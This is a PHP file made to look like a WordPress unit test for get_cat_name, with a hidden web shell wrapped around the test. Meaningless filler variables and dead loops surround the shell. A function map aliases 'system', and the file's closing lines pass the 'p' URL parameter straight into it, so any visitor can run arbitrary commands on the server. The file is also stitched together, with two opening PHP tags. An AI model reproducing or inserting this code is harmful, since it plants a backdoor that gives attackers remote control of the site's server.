<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * @group taxonomy
 * @group category
 *
 * @covers ::get_cat_name
 */
class Tests_Category_GetCatName extends WP_UnitTestCase {

	/**
	 * Validate get_cat_name function
	 */
	public function test_get_cat_name() {

		// Create test category.
		$testcat = self::factory()->category->create_and_get(
			array(
				'slug' => 'testcat',
				'name' => 'Test Category 1',
			)
		);

		// Validate.
		$this->assertSame( $testcat->name, get_cat_name( $testcat->term_id ) );
		$this->assertSame( '', get_cat_name( -1 ) );
		$this->assertSame( '', get_cat_name( $testcat->term_id + 100 ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>